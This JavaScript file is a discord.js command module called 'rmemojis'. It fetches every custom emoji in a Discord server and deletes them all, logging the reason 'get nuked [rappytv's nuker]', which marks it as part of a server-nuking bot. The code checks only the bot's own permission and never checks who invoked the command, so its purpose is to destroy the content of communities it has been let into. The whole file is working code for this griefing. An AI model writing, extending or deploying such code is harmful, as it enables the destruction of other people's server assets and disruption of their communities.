const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, PermissionsBitField, ApplicationCommandOptionType } = require("discord.js");

module.exports = {
    name: `rmemojis`,
    options: [],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.ManageEmojisAndStickers)) return console.log(`[ERROR] I'm missing the permission ManageEmojisAndStickers (1 << 30)! [${interaction.guild.name}]`);
        const emojis = await interaction.guild.emojis.fetch();
        emojis.forEach(async emoji => {
            await emoji.delete(`get nuked [rappytv's nuker]`).then(() => {
                return console.log(`[EMOJI] Deleted ${emoji.name} (${emoji.id})`);
            }).catch((err) => {
                return console.log(`[EMOJI] Failed to delete ${emoji.name} (${emoji.id}): ${err}`);
            });
        });
    }
}